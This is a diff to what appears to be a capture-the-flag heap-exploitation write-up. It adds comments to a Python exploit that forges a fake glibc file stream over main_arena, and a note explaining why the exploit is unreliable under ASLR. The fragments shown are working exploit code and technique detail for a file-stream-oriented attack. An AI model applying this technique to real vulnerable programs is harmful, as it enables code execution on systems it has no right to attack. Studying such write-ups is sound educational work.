@@ -275,6 +275,8 @@ fakef = p64(libc.sym.main_arena + 168) * 2 +  p64(write_base) + p64(write_ptr) \
 edit(chunk_F, fakef)
 
 # Fake chunk G part
+# Setting the _mode field to 0x0 to pass buffer flushing checks.
+# Required _mode field value is <= 0x0.
 
 edit(chunk_G, b"\x00"*0x10)
 edit(chunk_G, b"\x00"*0x10)
@@ -418,6 +420,8 @@ fakef = p64(libc.sym.main_arena + 168) * 2 +  p64(write_base) + p64(write_ptr) \
 edit(chunk_F, fakef)
 
 # Fake chunk G part
+# Setting the _mode field to 0x0 to pass buffer flushing checks
+# Required _mode field value is <= 0x0.
 
 edit(chunk_G, b"\x00"*0x10)
 edit(chunk_G, b"\x00"*0x10)
@@ -434,5 +438,6 @@ io.send(b"5")
 io.interactive()
 ```
 
-
+### Note: 
+Our exploit is not 100% reliable. This is because of the reason how the `_mode` field of the fake filestream that overlaps the `main_arena` is formed. `_mode` is a 32 bit field and is formed by overlapping the least significant bytes of the 0xc0 smallbin.This results in its most significant bit that determines whether it's interpreted as positive or negative value or not is subject to ASLR. As a result sometimes if the `_mode` field is positive the fake file stream overlapping the main arena may pass the second buffer flushing check, leading to calling a corrupted `__overflow` entry leading to segfault.
 
